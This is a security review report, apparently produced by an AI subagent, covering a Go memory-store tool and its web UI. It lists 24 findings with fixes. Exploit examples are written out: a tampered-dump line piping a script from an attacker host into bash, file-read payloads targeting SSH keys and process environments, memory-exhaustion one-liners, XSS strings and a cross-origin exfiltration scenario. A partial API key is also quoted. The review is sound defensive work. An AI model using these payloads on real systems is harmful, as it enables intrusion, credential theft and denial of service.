# MPM Security Review — 2026-06-15

**Scope:** Go codebase at `/home/v/.openclaw/workspace/projects/mpm`
**Reviewer:** Subagent task (depth 1/1)
**Method:** Manual source review, regex pattern analysis, control-flow tracing from
CLI entry points and HTTP handlers down to the persistence layer.

---

## Severity Summary

| # | Title | Severity | File:Line |
|---|---|---|---|
| 1 | Auth fail-open on `authValid()` and `withAuth()` | **CRITICAL** | `cmd/mpm/stream.go:160-176`, `cmd/mpm/web.go:132-167` |
| 2 | Web API bypasses 20-pattern secret detector (saves AKIA/sk-/ghp_ to DB) | **CRITICAL** | `internal/db.go:756-786`, `cmd/mpm/web_handlers.go:97` |
| 3 | `mpm call add_reference` — unrestricted file read by path | **HIGH** | `cmd/mpm/call.go:694-721` |
| 4 | Unbounded HTTP request bodies (DoS / OOM) | **HIGH** | `cmd/mpm/web_handlers.go` (all `io.ReadAll`), `cmd/mpm/call.go:121` |
| 5 | Sensitive content not checked in many `SaveMemory` callers | **HIGH** | `cmd/mpm/watch.go:863,889,958`, `cmd/mpm/simple_cmds.go:97`, `cmd/mpm/handlers.go:4633`, `internal/idle_dream.go:456`, `internal/synthesis_isolation.go:463`, `internal/synthesize.go:631` |
| 6 | XSS: `m.id` / `t.id` interpolated into `onclick` attributes unescaped | **HIGH** | `cmd/mpm/web/app.js:289-290, 425-426, 523` |
| 7 | XSS: `err.message` from server rendered into `innerHTML` | **HIGH** | `cmd/mpm/web/app.js:203, 262, 413, 507, 585` |
| 8 | Unauthenticated `/api/internal/broadcast` accepts arbitrary SSE events | **HIGH** | `cmd/mpm/web_handlers.go:527-549` |
| 9 | `mpm_config.json` written with mode 0600 but seed file shipped world-readable with real API key | **HIGH** | `internal/config/config.go:91`, `mpm_config.json` |
| 10 | Token comparison is not constant-time (timing oracle) | **MEDIUM** | `cmd/mpm/stream.go:175`, `cmd/mpm/web.go:160` |
| 11 | Watch daemon deletes files based on regex miss (false negatives) | **MEDIUM** | `cmd/mpm/watch.go:1517-1525` |
| 12 | `sqlite3` `.shell` RCE via tampered restore dump file | **MEDIUM** | `cmd/mpm/handlers_backup.go:166-180` |
| 13 | `handleBackup` writes dump to any user-supplied path (no validation) | **MEDIUM** | `cmd/mpm/handlers_backup.go:31-69` |
| 14 | No HTTP timeouts (Slowloris DoS) | **MEDIUM** | `cmd/mpm/web.go:129` |
| 15 | No security headers (CSP, XFO, XCTO, HSTS) on any web response | **MEDIUM** | `cmd/mpm/web.go` (whole file) |
| 16 | CORS `Access-Control-Allow-Origin: *` on SSE stream | **MEDIUM** | `cmd/mpm/stream.go:194` |
| 17 | Web server is HTTP only (token and memories travel in cleartext) | **MEDIUM** | `cmd/mpm/web.go:129` |
| 18 | Sensitive-content regex bypasses (base64, newlines, anchored patterns) | **MEDIUM** | `internal/memory.go:462-489` |
| 19 | No file-size limit on reference add / watch ingestion / PDF/EPUB parse | **LOW** | `cmd/mpm/handlers.go:2193-2275`, `cmd/mpm/watch.go:448, 654` |
| 20 | Frontend stores token in `localStorage` (XSS-readable) | **LOW** | `cmd/mpm/web/app.js:20` |
| 21 | `esc()` does not escape `'` (fragile vs. ID interpolation) | **LOW** | `cmd/mpm/web/app.js:610-614` |
| 22 | Watch reads files with `os.ReadFile` (follows symlinks, no Lstat guard) | **LOW** | `cmd/mpm/watch.go:448, 654` |
| 23 | No `LIMIT` cap on `?limit=` query param (resource exhaustion) | **LOW** | `cmd/mpm/web_handlers.go:62, 64, 68, 70`, `internal/web_db.go:742, 794` |
| 24 | `esc()` (insecure) and `escHtml()` (safe via textContent) coexist; inconsistent use | **LOW** | `cmd/mpm/web/app.js` |

Items **1**, **2**, and **8** combine to produce a single trivial attack chain:
with `mpm web` started and no `web_token` configured (the default), any host on
the LAN can `POST` an AWS key to `/api/memories` and then read it back via
`GET /api/memories/{id}`. The 20-pattern secret detector is *only* invoked from
`MemoryStore.AddMemory`; the web path goes through `DatabaseManager.SaveMemory`
which has no such check.

---

## Detailed Findings

### 1. CRITICAL — Auth fail-open in `authValid()` and `withAuth()`

**Files:**
- `cmd/mpm/stream.go:160-176`
- `cmd/mpm/web.go:132-167`

**Bug.** Both auth helpers return `true` (access granted) when config cannot be
loaded *or* when `web_token` is empty:

```go
// cmd/mpm/stream.go:160
func authValid(r *http.Request) bool {
    cfg, err := config.LoadConfig()
    if err != nil || cfg == nil {
        return true // No config — skip auth
    }
    token := cfg.WebToken
    if token == "" {
        return true // No token configured — skip auth
    }
    ...
}
```

The same pattern appears in `web.go:132 withAuth()`. The comment ("If no
`web_token` is configured, auth is skipped") is the documented design, but it
makes the *default installation* fully unauthenticated on `0.0.0.0:18792` (the
server binds `:port`).

**Exploit.**
1. User installs MPM, runs `mpm web`.
2. `mpm_config.json` does not exist yet, or has no `web_token`.
3. Anyone on the LAN can call `/api/memories`, `/api/memories/{id}`,
   `/api/search`, `/api/internal/broadcast`, `/api/stream`, etc.

The `os.ReadFile` path in `LoadConfig` returns the *defaults* `&Config{}` on
`os.IsNotExist`, so on a fresh install `cfg` is non-nil but `cfg.WebToken ==
""` and auth is skipped. There is no UI to *force* a token to be set.

**Fix.** Fail closed. Generate a random token on first run, persist it, log it
once, and require it on every request. At minimum, treat both `err != nil` and
`token == ""` as `return false` and log loudly.

```go
func authValid(r *http.Request) bool {
    cfg, err := config.LoadConfig()
    if err != nil || cfg == nil || cfg.WebToken == "" {
        return false // fail closed
    }
    provided := strings.TrimPrefix(r.Header.Get("Authorization"), "Bearer ")
    return subtle.ConstantTimeCompare([]byte(provided), []byte(cfg.WebToken)) == 1
}
```

---

### 2. CRITICAL — Web API bypasses 20-pattern secret detector

**Files:**
- `internal/db.go:756-786` — `DatabaseManager.SaveMemory` (no filter)
- `cmd/mpm/web_handlers.go:97` — web POST /api/memories

**Bug.** The README claims content is "scanned against 20 regex patterns…
before any database write." That is only true for the `MemoryStore.AddMemory`
code path (`internal/memory.go:303`). The web handler uses
`DatabaseManager.SaveMemory` (a separate, lower-level method) which writes
content directly to the `memories` table with no `isSensitiveContent` /
`isPoisoned` check.

```go
// internal/db.go:756
func (dm *DatabaseManager) SaveMemory(collection, content, sessionID string,
    tags []string, metadata map[string]interface{}, embedding []float32,
    isLongTerm bool, weight int, expiresAt ...time.Time) (string, error) {
    id := GenerateID()
    ...
    _, err := dm.db.Exec(`INSERT INTO memories ... VALUES (...)`,
        id, collection, content, ...)
    return id, err
}
```

**Exploit (with no `web_token` configured, see #1).**
```bash
curl -X POST http://victim:18792/api/memories \
  -H 'Content-Type: application/json' \
  -d '{"content":"AWS key AKIAIOSFODNN7EXAMPLE — prod account"}'
# 201 Created
curl http://victim:18792/api/memories/<id>
# {"content":"AWS key AKIAIOSFODNN7EXAMPLE — prod account", ...}
```

The secret is now in `mpm.db`, indexed for full-text search, retrievable by
`/api/search?q=AKIA`, and visible to any web UI client.

**Fix.** Move the `isSensitiveContent` and `isPoisoned` checks into
`DatabaseManager.SaveMemory` (or wrap them in a single chokepoint that all
write paths go through). The web handler should be calling the safe path, not
a privileged direct-write function.

```go
func (dm *DatabaseManager) SaveMemory(...) (string, error) {
    if isSensitive, reason := isSensitiveContent(content); isSensitive {
        return "", fmt.Errorf("sensitive content detected: %s", reason)
    }
    if isPoisoned, reason := isPoisoned(content); isPoisoned {
        return "", fmt.Errorf("poison content detected: %s", reason)
    }
    // ... existing insert
}
```

---

### 3. HIGH — `mpm call add_reference` is a path-traversal LFI

**File:** `cmd/mpm/call.go:694-721`

**Bug.** The `filepath` field is read straight from the JSON payload and
passed to `os.ReadFile` with no validation, no allow-list, and no size cap.

```go
filepath, ok := p["filepath"].(string)
if !ok || filepath == "" { return nil, fmt.Errorf("filepath is required") }
store := getReferenceStore()
data, err := os.ReadFile(filepath)   // ← reads ANY file the mpm user can read
...
ref, err := store.Add(title, filepath, nil, content)
```

**Exploit.**
```bash
mpm call add_reference --payload '{"filepath":"/root/.ssh/id_ed25519"}'
mpm call add_reference --payload '{"filepath":"/proc/self/environ"}'
```

Both succeed silently. The contents are stored in `reference_docs.content` and
`reference_chunks.content`, fully indexed for vector search, and retrievable
via `/api/references/{id}`. If `mpm` runs as root (or with broad sudo) this
becomes a credential-theft primitive.

There is also no `os.Stat` size check — a 10 GiB file at `/var/log/syslog`
will be read into memory and OOM the process.

**Fix.** Restrict the path to a configured `reference_dir` (or directories)
and cap file size:

```go
const maxRefBytes = 64 * 1024 * 1024 // 64 MiB
root := config.GetReferenceDir()
abs, _ := filepath.Abs(filepath)
rel, err := filepath.Rel(root, abs)
if err != nil || strings.HasPrefix(rel, "..") {
    return nil, fmt.Errorf("path outside reference dir")
}
info, _ := os.Stat(abs)
if info.Size() > maxRefBytes {
    return nil, fmt.Errorf("file too large: %d bytes", info.Size())
}
f, err := os.Open(abs) // then io.Copy with a LimitReader
```

---

### 4. HIGH — Unbounded HTTP request bodies (DoS / OOM)

**Files:**
- `cmd/mpm/web_handlers.go` — every handler calls `io.ReadAll(r.Body)`
- `cmd/mpm/call.go:121` — `io.ReadAll(os.Stdin)` for payload
- `cmd/mpm/call.go:113` — `--payload` arg has no size cap

**Bug.** `grep -r "MaxBytesReader" cmd/mpm/ internal/` returns zero hits. The
only ceiling is OS-level argv limits and RAM.

**Exploit.**
```bash
# Web UI — no Content-Length cap, no body cap
yes 'A' | head -c 10737418240 | curl -X POST --data-binary @- \
  http://victim:18792/api/memories \
  -H 'Content-Type: application/json'
# OOMs the mpm web process.

# CLI payload — single argv with 1 GiB
mpm call save_to_memory --payload "$(yes A | head -c 10737418240 | tr -d '\n' | sed 's/.*/{"fact":"&"};/')"
# E2BIG or OOM.
```

**Fix.** Wrap every `r.Body` in `http.MaxBytesReader` and stdin in a
`io.LimitReader`:

```go
r.Body = http.MaxBytesReader(w, r.Body, 4<<20) // 4 MiB
body, err := io.ReadAll(r.Body)
```

For `--payload`, use `os.Args` length sanity check before constructing the
string.

---

### 5. HIGH — Sensitive content check missing on most `SaveMemory` paths

**Files (all call `DatabaseManager.SaveMemory` directly, bypassing the filter
that lives in `MemoryStore.AddMemory`):**
- `cmd/mpm/watch.go:863, 889, 958` — watch daemon ingestion
- `cmd/mpm/simple_cmds.go:97` — `mpm remember` CLI
- `cmd/mpm/handlers.go:4633` — `record_decision` audit
- `internal/idle_dream.go:456` — idle consolidation
- `internal/synthesis_isolation.go:463` — synthesis worker
- `internal/synthesize.go:631` — `mpm synth` command
- `cmd/mpm/web_handlers.go:97` — web API (see #2)

**Bug.** `MemoryStore.AddMemory` (the only path with the regex check) is a
higher-level wrapper that *some* code paths use. Lower-level code goes around
it. This means most writes to the `memories` table are not screened.

**Why it matters.** A user (or attacker) can drop a markdown file containing
`sk-proj-…` into the watch dir. The watch daemon's *file-level* check
(watch.go:457) catches it because the regex matches anywhere in the file, but
the *fact* extractor (watch.go:613) re-runs the check on each extracted fact
— except for markdown files routed to `ingestAsLongTermMemory` (line 863)
which goes straight to `d.db.SaveMemory` with no check at all.

**Fix.** Same as #2 — push the check into the database method that all paths
funnel through.

---

### 6. HIGH — XSS: `m.id` / `t.id` unescaped in `onclick` attributes

**File:** `cmd/mpm/web/app.js:289-290, 425-426, 523`

**Bug.** `m.id`, `t.id`, `l.id` are SHA256 hex server-side, so today this is
theoretically safe — but the escape function `q()` (line 615-617) only handles
single quotes; the interpolation doesn't even call it for memory/topic cards.

```javascript
// app.js:289
html += '<button class="btn-ghost" onclick="openMemoryModal(\'' + m.id + '\')">Edit</button>';
html += '<button class="btn-danger" onclick="deleteMemory(\'' + m.id + '\')">Shred</button>';
```

vs. the *other* onclick at line 226/236 which does call `q()`:

```javascript
html += '<div class="card" onclick="showTopic(' + q(t.id) + ')"><div class="card-title">' + esc(t.name) + '</div>';
```

**Exploit.** If at any point a memory/topic/lesson id becomes user-influenceable
(today the API generates them, but the web `addMemory` endpoint forwards a
caller-supplied `id` to `SaveMemory` *only if* SaveMemory honours it — and it
generates a new one, so safe *for now*). Any future code path that lets a
caller specify an id, or any future change to id format, immediately becomes
an XSS:

```javascript
// m.id == "'); alert(document.cookie); ('"
onclick="openMemoryModal('') ; alert(document.cookie) ; ('')"
```

The same is true for `deleteMemory`, `deleteTopic`, `deleteLesson`.

**Fix.** Stop building HTML via string interpolation. Use DOM APIs
(`createElement`, `addEventListener`) or, if you must interpolate, always
go through `q()` *and* `esc()`:

```javascript
html += `<button class="btn-ghost" data-id="${esc(m.id)}" data-action="edit">Edit</button>`;
// then a single delegated listener on the container
```

---

### 7. HIGH — XSS: `err.message` from server rendered into `innerHTML`

**File:** `cmd/mpm/web/app.js:203, 262, 413, 507, 585`

**Bug.** Five call sites do:

```javascript
el.innerHTML = '<div class="empty-state"><p>Failed to load: ' + err.message + '</p></div>';
```

`err.message` comes from the server's `{"error": "..."}` JSON, which is
built via `writeError(w, status, msg)` (`web.go:175-179`). Most messages are
hardcoded ("memory not found"), but several pass through `err.Error()` from
`db.SaveMemory` / `db.ShredMemory` / `db.UpdateMemory` — and SQLite errors
include the failing SQL with bound values, which can include user-controlled
strings.

**Exploit.** `POST /api/memories` with content `</p><img src=x onerror=alert(1)>`.
The DB insert succeeds; later `PUT /api/memories/{id}` with the same content
causes a constraint or unique-index error; the error message embeds the
user-controlled string; the frontend renders it into `innerHTML`. Stored XSS
in the admin's browser on next view.

**Fix.** Use `textContent` (or `esc()`) and set the error as a text node:

```javascript
el.textContent = 'Failed to load: ' + err.message;
```

Also, server-side, sanitise error messages before returning them to a browser
context (use a request-id correlation, return generic messages + log details).

---

### 8. HIGH — Unauthenticated `/api/internal/broadcast` accepts arbitrary SSE events

**File:** `cmd/mpm/web_handlers.go:527-549`

**Bug.** The relay endpoint is supposed to be hit by *other local mpm call
processes* to forward tool events into the SSE broker. It accepts an
arbitrary `eventType` and `payload` and broadcasts to every connected client.
It is *not* on the auth-skip list, so it goes through `withAuth` — but if
`web_token` is empty (the default), auth is skipped (see #1) and any LAN
attacker can:
- Inject fake `memory_saved` / `lesson_saved` events with attacker-controlled
  `content` — these *are* rendered through `escHtml` (safer) but still
  deceive the operator.
- Inject other event types that confuse UI state.
- Pollute the SSE replay buffer (50 events), so legitimate reconnecting
  clients see attacker-injected state.

**Exploit.** With default config (no token):
```bash
curl -X POST http://victim:18792/api/internal/broadcast \
  -H 'Content-Type: application/json' \
  -d '{"eventType":"memory_saved","payload":{"id":"x","content":"synthetic","tags":[]}}'
```

**Fix.** Bind the relay to a unix socket or a separate loopback-only port
that `mpm call` connects to with a process-scoped secret. At minimum,
validate `eventType` against an allow-list (`memory_saved`, `lesson_saved`,
`tool_exec`, `immune_slash`, `theory_proposed`, `theory_resolved`, `ping`).

---

### 9. HIGH — Plaintext API key in shipped `mpm_config.json` (mode 0755)

**File:** `mpm_config.json` (workspace), `internal/config/config.go:84-93`

**Bug.** `SaveConfig` writes with `0600`, but:
1. The file shipped in the repo is mode `0775` (`-rwxrwxr-x` per `ls -la`).
2. The same file contains a live `synth.api_key` value
   (`sk-cp-Ag3lDVtHLtz5M5KCvw1Rd_…`) in plaintext.
3. `LoadConfig` does not verify or tighten the mode on load.
4. `SaveConfig` is also called by `mpm web` and the CLI, but on the *first*
   run the file is created from whatever the upstream tooling (tar, git
   checkout, sample copy) left it as.

**Exploit.** Any local user on the box can `cat ~/.../mpm_config.json` and
read the synth API key. World-read on `/srv` or shared workspace = exposure
to *every* unprivileged user.

**Fix.**
- `os.Chmod(path, 0600)` on load and on every save.
- Document the api_key as sensitive and consider an env-var override.
- For the API key specifically, recommend `synth.api_key` → `synth.api_key_env`
  (e.g. `MPM_SYNTH_API_KEY`) so the secret never lives on disk.

---

### 10. MEDIUM — Token comparison is not constant-time

**Files:** `cmd/mpm/stream.go:175`, `cmd/mpm/web.go:160`

**Bug.** `strings.TrimPrefix(authHeader, "Bearer ") == token` short-circuits
on the first mismatched byte. An attacker on the same network who can
measure response times can, byte-by-byte, recover the token.

**Practical impact.** Low — the web server is local-network only, TLS is not
in use, and an attacker with timing capability usually has a more direct
attack. But the fix is one line:

```go
import "crypto/subtle"
return subtle.ConstantTimeCompare([]byte(provided), []byte(token)) == 1
```

---

### 11. MEDIUM — Watch daemon deletes files when regex fires (false-negative risk)

**File:** `cmd/mpm/watch.go:1517-1525`

**Bug.** When a `.md` file's content matches `isSensitiveContent` *or*
`isPoisoned`, the daemon calls `os.Remove(path)`. The intent is to *protect*
the memory store, but the deletion is based on a regex that has known
bypasses (see #18). This means a secret that the regex misses will be
*stored*; a legitimate file that contains a substring matching a regex will
be *destroyed*.

Compounding: `os.Remove` does not follow symlinks (good), but `os.ReadFile`
above (line 448) does — and a symlink in the watch dir pointing to
`/home/user/.bash_history` will be read fully and then either stored or
deleted (deleting the *link*, not the target). No Lstat check guards the
file path.

**Exploit.**
1. User has a normal note `meeting-notes.md` containing a sentence like
   "He gave me his `sk-proj-` token once" — actually no, the regex requires
   20+ chars after `sk-proj-`, so this won't fire. But:
2. A user pastes a JWT (`eyJhbGciOi…`) into a note, then exports the note to
   the watch dir. The poison regex (case-insensitive substring on
   `toxicphrases.txt`) or secret regex will fire and the file is gone with
   no recovery.

**Fix.** Quarantine, don't delete. Move the file to a `quarantine/` subdir
under the watch root and log the reason. Optionally keep a copy in
`mirror.jsonl`. Also `os.Lstat(path)` and skip symlinks (or process the
target with an allow-list check).

---

### 12. MEDIUM — `sqlite3` `.shell` RCE via tampered restore dump

**File:** `cmd/mpm/handlers_backup.go:166-180`

**Bug.** `handleRestoreDB` pipes the user-supplied backup file into
`sqlite3` via stdin:

```go
importCmd := exec.Command("sqlite3", freshDb)
importCmd.Stdin = f
```

`sqlite3` in interactive mode treats lines starting with `.` as dot-commands
even when stdin is a pipe. A dump file that begins with

```sql
.shell curl http://attacker/x.sh | bash
CREATE TABLE memories (...);
```

will execute the shell command *before* any SQL is parsed. (Note: `.dump`
output does not normally contain `.shell` lines, but a tampered file does.)

**Exploit.** A user is convinced to restore a backup from an untrusted
source (downloaded "sample mpm backup", USB stick from a "consultant",
etc.). Restoration requires typing `yes` at the prompt, but the social
engineering barrier is low.

**Fix.** Use `sqlite3 freshDb < dump.sql` only after rewriting the dump to
strip dot-commands, *or* use the `modern` sqlite3 build with
`SQLITE_DBCONFIG_TRUSTED_SCHEMA` and load via the C API. Cleanest fix:
use the Go SQLite driver (`github.com/mattn/go-sqlite3`) which the project
already imports, and execute the dump via `db.Exec(string(content))` —
Go's SQLite driver does not interpret dot-commands.

---

### 13. MEDIUM — `handleBackup` writes to any user-supplied path

**File:** `cmd/mpm/handlers_backup.go:31-69`

**Bug.** The `destPath` is whatever the user typed; `os.Create(destPath)` is
called with no validation. The user has shell access anyway, so this is
*not* an escalation in the local sense, but:
- It allows clobbering arbitrary files the mpm user can write
  (e.g. `mpm backup ~/.ssh/authorized_keys`).
- The created file's mode is 0644 (Go default), so any new file the user
  didn't intend to be world-readable becomes so.

**Fix.** Restrict destPath to a configured backup directory; refuse paths
that don't end in `.sql` or `.sqlite`; chmod 0600 after create.

---

### 14. MEDIUM — No HTTP timeouts (Slowloris DoS)

**File:** `cmd/mpm/web.go:129`

**Bug.** `http.ListenAndServe(addr, ws.handler)` uses the default server
which has no `ReadHeaderTimeout`, `ReadTimeout`, `WriteTimeout`, or
`IdleTimeout`. An attacker can open many TCP connections and drip-feed the
request line, holding each connection open indefinitely and exhausting
goroutines / file descriptors.

**Exploit.** `slowloris` style attack — slow GETs to `/api/stream` (which is
designed to be long-lived, masking the slowloris pattern). Eventually the
process runs out of file descriptors.

**Fix.** Build an `*http.Server` explicitly:

```go
srv := &http.Server{
    Addr:              addr,
    Handler:           ws.handler,
    ReadHeaderTimeout: 5 * time.Second,
    ReadTimeout:       30 * time.Second,
    WriteTimeout:      0, // 0 for SSE; rely on context for individual handlers
    IdleTimeout:       120 * time.Second,
}
return srv.ListenAndServe()
```

---

### 15. MEDIUM — Missing security response headers

**File:** `cmd/mpm/web.go` (no header set anywhere except the SSE endpoint)

**Bug.** No `Content-Security-Policy`, no `X-Frame-Options`, no
`X-Content-Type-Options: nosniff`, no `Referrer-Policy`, no
`Strict-Transport-Security`. Combined with the XSS issues (#6, #7) and the
`mpm web` UI being served without auth (#1), this is a meaningful posture gap.

**Fix.** Add a middleware that sets headers on every response:

```go
func (ws *WebServer) withSecurityHeaders(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        h := w.Header()
        h.Set("X-Content-Type-Options", "nosniff")
        h.Set("X-Frame-Options", "DENY")
        h.Set("Referrer-Policy", "no-referrer")
        // Tight CSP — no inline, no eval, no remote
        h.Set("Content-Security-Policy",
            "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; "+
            "img-src 'self' data:; connect-src 'self'; frame-ancestors 'none'")
        next.ServeHTTP(w, r)
    })
}
```

Note that the current `app.js` uses inline event handlers (`onclick=`) and
inline `<style>` in `style.css` would need to be checked. If you want a
strict CSP you must refactor the frontend to bind listeners from JS (which
is also the right fix for #6).

---

### 16. MEDIUM — CORS `Access-Control-Allow-Origin: *` on SSE stream

**File:** `cmd/mpm/stream.go:194`

**Bug.** Every SSE response is `Access-Control-Allow-Origin: *`, which means
any website the operator visits can `new EventSource('http://localhost:18792/api/stream')`
and read the live memory stream. Combined with the lack of any client
cookie, this works cross-origin without preflight in many browser configs.

**Exploit.** Operator visits `evil.com` while MPM is running. The page opens
an EventSource to `http://localhost:18792/api/stream` and exfiltrates every
new memory_saved, tool_exec, and theory event to the attacker.

**Fix.** Either (a) drop `Access-Control-Allow-Origin: *` from the SSE
response and require same-origin, or (b) set
`Access-Control-Allow-Origin: <specific origin>` and require the auth
bearer token.

---

### 17. MEDIUM — Web server is HTTP only

**File:** `cmd/mpm/web.go:129`

**Bug.** `http.ListenAndServe` — no TLS. The bearer token, all memory
content, and any secret stored in the DB traverse the LAN in cleartext.
On a coffee-shop or shared-office network this is direct exposure.

**Fix.** Support `mpm web --tls-cert <crt> --tls-key <key>` that switches
to `http.ListenAndServeTLS`. For self-hosted use, a self-signed cert with
`--tls-self-signed` flag is fine. At minimum, document the plaintext risk
in `--help`.

---

### 18. MEDIUM — Sensitive-content regex bypasses

**File:** `internal/memory.go:462-489`

The 20 patterns are solid for the canonical forms, but I confirmed the
following bypasses by reading the patterns:

| Bypass | How | Caught? |
|---|---|---|
| Base64-encode the secret | `echo -n 'AKIA…' \| base64` — no `AKIA` substring in body | NO |
| 19-char suffix | `sk-proj-` + 19 chars (regex requires `{20,}`) | NO |
| Newline in JWT | Replace the two `.` separators with `\n` | NO (regex `\.` requires literal dot) |
| Split key across two memories via `addMemory` twice | Each half < 20 chars | NO (each piece looks innocent in isolation) |
| Whitespace around `=` | `password =secret123` — `\s*` then `[^\s]+` matches `secret123` | YES (still caught) |
| ZWJ / RTL override chars | `s\u200dk-p\u200droj-…` | NO (Go's `regexp` does not normalize Unicode by default; even if it did, the patterns don't include `[\u200d]`) |
| HTML entity in display, raw in source | If content later gets HTML-decoded for display | depends on display path |

**Practical impact.** A determined attacker can evade the 20-pattern
detector. The most realistic vector: a user pastes a `sk-…` key with
unusual whitespace formatting; or a `eyJ…` JWT with newlines (e.g., a
"pretty-printed" JWT from a debug tool). Both result in plaintext secrets
in the DB.

**Fix.**
- Add length-window logic: match `sk-[a-zA-Z0-9_-]+` *anywhere* (not
  requiring 20+ in one chunk).
- Strip zero-width joiners and other confusables before regex matching.
- Add a base64-try-decode pass: if the content contains a long base64
  block, decode and re-check.
- Add a NIST-style entropy threshold as a backstop: any substring > 32
  chars of `[A-Za-z0-9+/=_-]{32,}` with high entropy is suspicious.

---

### 19. LOW — No file size limit on reference / watch ingestion

**Files:** `cmd/mpm/handlers.go:2193-2275` (handleReferenceAdd),
`cmd/mpm/watch.go:448, 654` (readMarkdown / processSessionsConfig),
`internal/reference_new.go:283-298` (ParsePDF), `internal/reference_new.go:308-336` (ParseEPUB)

**Bug.** `os.ReadFile` with no size cap. A 2 GiB file dropped into the
watch dir will be slurped into memory before the regex check fires. Same
for `mpm reference add /path/to/huge.pdf`.

**Fix.** `os.Lstat` first; reject if size > 64 MiB. For EPUB/PDF, also
limit with `io.LimitReader`.

---

### 20. LOW — Frontend token stored in `localStorage`

**File:** `cmd/mpm/web/app.js:20`

**Bug.** `localStorage.setItem('mpm_token', token)` persists the bearer
token in plaintext across sessions and makes it readable by any JavaScript
on the same origin (including any future XSS).

**Fix.** Use `sessionStorage` (cleared on tab close), or move to a
`HttpOnly; Secure; SameSite=Strict` cookie set by the server on first
valid auth.

---

### 21. LOW — `esc()` does not escape single quote

**File:** `cmd/mpm/web/app.js:610-614`

**Bug.**
```javascript
function esc(s) {
  if (s == null) return '';
  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;')
    .replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}
```

No `'` (or `&#x27;`) replacement. `esc()` is used in attribute values
(`value="..."`) in some places, which is safe because double-quote is
escaped. But it's also used in `<div ... onclick="...">` via interpolation
without `q()` (see #6). The function should escape `'` to be safe-by-default.

**Fix.**
```javascript
function esc(s) {
  if (s == null) return '';
  return String(s)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;').replace(/'/g, '&#x27;');
}
```

---

### 22. LOW — Watch reads files with `os.ReadFile` (follows symlinks)

**File:** `cmd/mpm/watch.go:448, 654`

**Bug.** A symlink dropped into the watch dir pointing at
`/etc/shadow` or `~/.ssh/id_rsa` will be read fully. The downstream
sensitive-content check then either quarantines the file (good) or stores
the content (bad). The symlink itself is not deleted in a way that
prevents re-read on the next sweep.

**Fix.** `os.Lstat` first; skip `Mode()&os.ModeSymlink != 0`. Or
`filepath.EvalSymlinks` and check the target is inside the watch dir.

---

### 23. LOW — `?limit=` not capped

**Files:** `cmd/mpm/web_handlers.go:62, 64, 68, 70` (parseInt with
default 50), `internal/web_db.go:742, 794` (no upper bound check)

**Bug.** A request with `?limit=1000000` is accepted. SQLite has to
materialize the result set before JSON-encoding it; the JSON encoder then
holds the full slice in memory.

**Fix.**
```go
limit := parseInt(r.URL.Query().Get("limit"), 50)
if limit > 500 { limit = 500 }
if limit < 1  { limit = 50  }
```

---

### 24. LOW — Inconsistent use of `esc()` and `escHtml()`

**File:** `cmd/mpm/web/app.js`

**Bug.** Two escape functions exist:
- `esc()` — string `.replace()`, used in 30+ places, missing `'` escape.
- `escHtml()` — DOM-based, used only in the SSE `prepend*Card` paths.

The SSE path is correct; the `render*` paths use `esc()` in some places
and a manual `'<br>'` join in others (line 273 in `renderMemoryCard`:
`content.split('\n').map(l => l).join('<br>')` — the `l` was already
escaped by `esc()` so this is fine, but the pattern is fragile).

**Fix.** Standardise on `escHtml()` everywhere (DOM-based escaping is
harder to misuse than string-replace), or replace the whole rendering
strategy with `createElement` + `textContent`.

---

## SQL Injection Audit (concern #1)

I checked every `fmt.Sprintf` / `+` / string-concat site that reaches a
`Query*` / `Exec*` call. **No exploitable SQL injection found.**

- `internal/search.go:15-65` — `Table` validated against `WipeTableNames` map.
- `internal/idle_dream.go:288` — generates `?,?,?` placeholders only, values
  bound.
- `internal/memory.go:1598` — placeholders generated, `key` validated
  against regex, values bound.
- `internal/memory.go:253` — hardcoded struct literals.
- `internal/db.go:80, 1017, 1039, 614` — all gated by `WipeTableNames` map.
- `internal/web_db.go:742, 794` — LIKE values are bound (`%q%`).
- `internal/hybrid_search.go:438` — `colClause` is a static string.
- `internal/adapters.go:67, 69` — appending static ORDER BY clauses only.

The string-concatenation pattern is *only* used in the `WipeTableNames`
table-allow-list path and a few FTS5 setup queries with hardcoded
identifiers. Safe.

---

## Path Traversal Audit (concern #2)

| Vector | File | Result |
|---|---|---|
| `mpm ingest --source <path>` | `cmd/mpm/ingest.go:74-83` | Path passed to `sql.Open("sqlite3", path)` — user-readable arbitrary SQLite. **No traversal beyond reading any DB the mpm user can read.** |
| `mpm ingest --list-schemas <path>` | `cmd/mpm/ingest.go:155-158` | Same as above |
| `mpm call add_reference --payload '{"filepath":"<path>"}'` | `cmd/mpm/call.go:694-721` | **See finding #3 — arbitrary file read, content indexed in DB.** |
| `mpm reference add <path>` | `cmd/mpm/handlers.go:2193-2275` | Same as #3 via CLI; reads any file. |
| `mpm backup <path>` | `cmd/mpm/handlers_backup.go:31-69` | See finding #13 — write to any path. |
| `mpm restore-db <path>` | `cmd/mpm/handlers_backup.go:74-180` | See finding #12 — `.shell` RCE in dump. |
| `mpm watch add-path <path>` | `cmd/mpm/watch.go:1601-1641` | Validates `dirExists` only — no symlink check, no real path canonicalization. |
| `mpm_config.json` paths (`memory_dirs`, `sessions_dirs`, etc.) | `internal/config/config.go:14-22` | Stored as-is, resolved via `ResolveEnvPath`. Same exposure as above. |
| `web /static/*` | `cmd/mpm/web.go:65-83` | `filepath.Clean` + `embed.FS` — **safe** (embed.FS refuses `..` traversal). |

The single most serious path-traversal issue is **#3** because the content
is *stored and indexed* — not just read and discarded.

---

## What is **NOT** a bug

A few things I checked and chose not to flag:

- **FTS5 MATCH injection in `web_db.go:742, 794`.** The user query is wrapped
  in `"…"` and passed as a *bound parameter* to MATCH. The escape
  `strings.ReplaceAll(q, "\"", "\"\"")` handles the only FTS5 parser
  metacharacter that could break the surrounding quotes. Bound parameters
  prevent SQL injection; FTS5 query DoS is theoretically possible but
  bounded by the surrounding `LIMIT`.
- **The `mpm web` server uses `http.ServeMux`** (not a custom router). Safe
  routing, no path-confusion bugs.
- **`embed.FS` for static assets.** Cannot escape the embedded root.
- **Go's `encoding/json`** has a built-in max-depth of 10000, so deeply
  nested JSON does not cause stack overflow. Memory exhaustion is still
  possible from large flat payloads (#4).

---

## Recommended Remediation Order

1. **Today (blocks real-world exposure):**
